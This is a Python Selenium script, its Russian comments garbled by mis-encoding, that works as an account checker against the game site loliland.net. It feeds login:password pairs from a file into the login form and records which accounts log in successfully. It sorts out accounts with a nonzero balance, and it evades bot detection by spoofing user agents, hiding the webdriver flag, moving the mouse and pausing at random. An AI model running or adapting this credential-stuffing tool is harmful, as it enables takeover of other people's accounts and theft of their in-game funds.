import random  # –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ —Å–ª—É—á–∞–π–Ω—ã—Ö —á–∏—Å–µ–ª
from selenium import webdriver  # —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –±—Ä–∞—É–∑–µ—Ä–æ–º
from selenium.webdriver.common.by import By  # –ø–æ–∏—Å–∫ —ç–ª–µ–º–µ–Ω—Ç–æ–≤ HTML 
from selenium.webdriver.support import expected_conditions as EC  # –æ–∂–∏–¥–∞–µ–º—ã–µ —É—Å–ª–æ–≤–∏—è
from selenium.webdriver.support.ui import WebDriverWait  # –æ–∂–∏–¥–∞–Ω–∏—è
import time  # –¥–ª—è –ø–∞—É–∑—ã –≤ –¥–µ–π—Å—Ç–≤–∏—è—Ö
from fake_useragent import UserAgent 
from selenium.webdriver.common.action_chains import ActionChains


# –°–æ–∑–¥–∞–µ–º —ç–∫–∑–µ–º–ø–ª—è—Ä UserAgent
ua = UserAgent()

# –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —Å–ª—É—á–∞–π–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π –∞–≥–µ–Ω—Ç
random_user_agent = ua.random

# –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –±—Ä–∞—É–∑–µ—Ä–∞
options = webdriver.ChromeOptions()
options.add_argument(f"user-agent={random_user_agent}")  # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å–ª—É—á–∞–π–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π –∞–≥–µ–Ω—Ç
# options.add_argument("--headless")  # –ó–∞–∫–æ–º–º–µ–Ω—Ç–∏—Ä–æ–≤–∞—Ç—å, –µ—Å–ª–∏ –Ω—É–∂–µ–Ω –≤–∏–¥–∏–º—ã–π –±—Ä–∞—É–∑–µ—Ä
# –¥–ª—è –º–µ–Ω—å—à–µ–≥–æ —à–∞–Ω—Å–∞ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è
options.add_argument("--disable-gpu")
options.add_argument("--no-sandbox")
options.add_argument("--disable-dev-shm-usage")
options.add_argument("--remote-debugging-port=9222")
#options.add_argument('--proxy-server=IP:PORT') –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø—Ä–æ–∫—Å–∏

# –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±—Ä–∞—É–∑–µ—Ä–∞ —Å –∑–∞–¥–∞–Ω–Ω—ã–º–∏ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞–º–∏
driver = webdriver.Chrome(options=options)  
driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})") # 

# —ç–º—É–ª—è—Ü–∏—è –¥–≤–∏–∂–µ–Ω–∏—è –º—ã—à–∫–∏
action = ActionChains(driver)
action.move_by_offset(random.randint(100, 400), random.randint(100, 400)).perform()

# –§–∞–π–ª—ã –¥–ª—è –≤—Ö–æ–¥–∞ –∏ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤
input_file = "accounts_check.txt"
output_file = "results.txt"
output_best_file = "money_results.txt"
 
cnt = 0

try:
    # –ß–∏—Ç–∞–µ–º –ª–æ–≥–∏–Ω—ã –∏ –ø–∞—Ä–æ–ª–∏ –∏–∑ —Ñ–∞–π–ª–∞
    with open(input_file, "r") as file:
        accounts = file.readlines()

    results = []
    best_results = []

    # –∑–∞—Ö–æ–¥–∏–º –Ω–∞ —Å–∞–π—Ç
    driver.get("https://loliland.net/start")
    time.sleep(random.randint(15, 20))  # –°–ª—É—á–∞–π–Ω–∞—è –ø–∞—É–∑–∞ –æ—Ç 15 –¥–æ 20 —Å–µ–∫—É–Ω–¥

    for account in accounts:
        cnt += 1
        login, password = account.strip().split(':')  # –†–∞–∑–¥–µ–ª—è–µ–º –ª–æ–≥–∏–Ω –∏ –ø–∞—Ä–æ–ª—å
        print(f'üîÑ –í—Ö–æ–¥ –≤ –∞–∫–∫–∞—É–Ω—Ç {login}:{password}   {cnt}/{len(accounts)}')

        # –ù–∞—Ö–æ–¥–∏–º –ø–æ–ª–µ –ª–æ–≥–∏–Ω–∞ (–ø–æ placeholder)
        login_field = driver.find_element(By.XPATH, "//input[@placeholder='–õ–æ–≥–∏–Ω']")
        login_field.clear()  # –û—á–∏—â–∞–µ–º –ø–æ–ª–µ –ª–æ–≥–∏–Ω–∞
        login_field.send_keys(login)

        time.sleep(random.randint(3, 20))  # –°–ª—É—á–∞–π–Ω–∞—è –ø–∞—É–∑–∞ –æ—Ç 3 –¥–æ 20 —Å–µ–∫—É–Ω–¥

        # –ù–∞—Ö–æ–¥–∏–º –ø–æ–ª–µ –ø–∞—Ä–æ–ª—è (–ø–æ placeholder)
        password_field = driver.find_element(By.XPATH, "//input[@placeholder='–ü–∞—Ä–æ–ª—å']")
        password_field.clear()  # –û—á–∏—â–∞–µ–º –ø–æ–ª–µ –ø–∞—Ä–æ–ª—è
        password_field.send_keys(password)

        # –ò—â–µ–º –∫–Ω–æ–ø–∫—É –≤—Ö–æ–¥–∞ (–æ–Ω–∞ –≤–Ω—É—Ç—Ä–∏ <div class="btn-drop">) –∏ –∫–ª–∏–∫–∞–µ–º
        login_button = driver.find_element(By.CLASS_NAME, "btn-drop")
        login_button.click()

        time.sleep(random.randint(5, 20))  # –°–ª—É—á–∞–π–Ω–∞—è –ø–∞—É–∑–∞ –æ—Ç 5 –¥–æ 20 —Å–µ–∫—É–Ω–¥

        # –ü—Ä–æ–≤–µ—Ä—è–µ–º —É—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥ –ø–æ –Ω–∞–ª–∏—á–∏—é —ç–ª–µ–º–µ–Ω—Ç–∞ —Å –∫–ª–∞—Å—Å–æ–º 'profile_div'
        try:
            profile_div = driver.find_element(By.CLASS_NAME, "profile_div")

            # –ù–∞—Ö–æ–¥–∏–º –∏ –Ω–∞–∂–∏–º–∞–µ–º –∫–Ω–æ–ø–∫—É –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ –¥–µ–Ω–µ–≥ –∏ "–í—ã–π—Ç–∏" 
            try:
                balance_element = driver.find_element(By.XPATH, "//div[contains(@class, 'badge green')]")
                balance = balance_element.text  # –ü–æ–ª—É—á–∞–µ–º —Ç–µ–∫—Å—Ç, –∫–æ—Ç–æ—Ä—ã–π —Å–æ–¥–µ—Ä–∂–∏—Ç –±–∞–ª–∞–Ω—Å
                print(balance)
                if balance[0] != '0':
                    print(f"üî•üî•üî• –£—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥! {login}:{password} –ë–∞–ª–∞–Ω—Å –∏–≥—Ä–æ–∫–∞: {balance}")  
                    best_results.append(f"üî•üî•üî• –£—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥! {login}:{password} –ë–∞–ª–∞–Ω—Å –∏–≥—Ä–æ–∫–∞: {balance}") 
                else:
                    results.append(f"‚úÖ –£—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥! {login}:{password} –ë–∞–ª–∞–Ω—Å –∏–≥—Ä–æ–∫–∞: {balance}") 
                    print(f"‚úÖ –£—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥! {login}:{password} –ë–∞–ª–∞–Ω—Å –∏–≥—Ä–æ–∫–∞: {balance}")   

                # –ñ–¥–µ–º, –ø–æ–∫–∞ –∫–Ω–æ–ø–∫–∞ "–í—ã–π—Ç–∏" —Å—Ç–∞–Ω–µ—Ç –¥–æ—Å—Ç—É–ø–Ω–æ–π
                WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//div[contains(@class, 'button_profile') and contains(text(), '–í—ã–π—Ç–∏')]")))
                logout_button = driver.find_element(By.XPATH, "//div[contains(@class, 'button_profile') and contains(text(), '–í—ã–π—Ç–∏')]")
                logout_button.click()
                time.sleep(random.randint(15, 20))  # –ü–∞—É–∑–∞ –ø–æ—Å–ª–µ –≤—ã—Ö–æ–¥–∞
            except Exception as e:
                print(f"‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –≤—ã–π—Ç–∏ –∏–∑ –∞–∫–∫–∞—É–Ω—Ç–∞: {e}")

        except Exception as e:
            #results.append(f"‚ùå –û—à–∏–±–∫–∞ –≤—Ö–æ–¥–∞! {login}:{password}")
            print(f"‚ùå –û—à–∏–±–∫–∞ –≤—Ö–æ–¥–∞! {login}:{password}")

    # –ó–∞–ø–∏—Å—ã–≤–∞–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã –≤ —Ñ–∞–π–ª
    with open(output_file, "w") as file:
        for result in results:
            file.write(result + "\n")

    with open(output_best_file, "w") as file:
        for result in best_results:
            file.write(result + "\n")

finally:
    driver.quit()  # –ó–∞–∫—Ä—ã–≤–∞–µ–º –±—Ä–∞—É–∑–µ—Ä
    print("üèÅ –ü—Ä–æ–≤–µ—Ä–∫–∞ —É—Å–ø–µ—à–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!")
